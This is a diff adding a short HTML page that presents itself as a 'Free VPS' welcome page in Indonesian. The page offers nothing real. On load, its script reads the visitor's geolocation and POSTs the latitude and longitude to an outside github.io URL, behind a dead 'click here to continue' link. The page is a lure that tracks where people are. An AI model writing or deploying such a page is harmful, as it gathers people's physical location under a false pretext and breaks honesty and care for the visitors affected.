@@ -1,0 +1,39 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free VPS</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Menggunakan API Geolocation untuk mendapatkan lokasi pengguna
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var latitude = position.coords.latitude;
+                var longitude = position.coords.longitude;
+                
+                // Mengirim data lokasi ke server
+                $.ajax({
+                    url: 'https://muellergtps.github.io/img',
+                    type: 'POST',
+                    data: {
+                        latitude: latitude,
+                        longitude: longitude
+                    },
+                    success: function(response) {
+                        // Menampilkan pesan sukses
+                        alert('Lokasi Anda telah dikirim ke server.');
+                    },
+                    error: function() {
+                        // Menampilkan pesan kesalahan
+                        alert('Gagal mengirim lokasi Anda ke server.');
+                    }
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Selamat Datang di VPS(OKS)</h1>
+    <p>Klik <a href="#">di sini</a> untuk melanjutkan.</p>
+</body>
+</html>
